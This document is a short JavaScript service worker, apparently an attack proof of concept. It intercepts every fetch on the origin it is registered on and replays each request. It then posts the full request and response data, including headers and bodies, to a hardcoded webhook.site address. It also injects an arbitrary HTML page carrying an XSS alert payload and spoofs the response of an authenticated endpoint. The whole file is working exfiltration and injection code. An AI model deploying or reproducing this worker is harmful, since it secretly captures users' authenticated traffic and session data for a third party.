// configurables
const webhook = "https://webhook.site/d873cc2f-9803-4049-bdd9-8fc8d783bdc2"

self.addEventListener("fetch", async (event) => {
    const request = event.request

    // send your own response
    if (request.url.includes("some-authenticated-endpoint.txt")) {
        event.respondWith(new Response("lol"))
    } else if (request.url.includes("injectedpath")) { // i can add arbitrary pages and access the DOM :)
        const injectedPathResponseOptions = {
            headers: {
                "content-type": "text/html"
            }
        }
        event.respondWith(new Response("<script>alert(document.domain)</script>", injectedPathResponseOptions))
    }

    // replay the request
    const response = await fetch(request)
    
    // consue response
    const responseBody = await response.text()

    const body = {
        requestMethod: request.method,
        requestUrl: request.url,
        requestHeaders: request.headers,
        requestBody: request.body,
        responseStatus: response.status,
        responseHeaders: response.headers,
        responseBody
    }
    
    // send response to webhook
    const requestOptions = {
        method: "post",
        body: JSON.stringify(body)
    }
    fetch(webhook, requestOptions)
})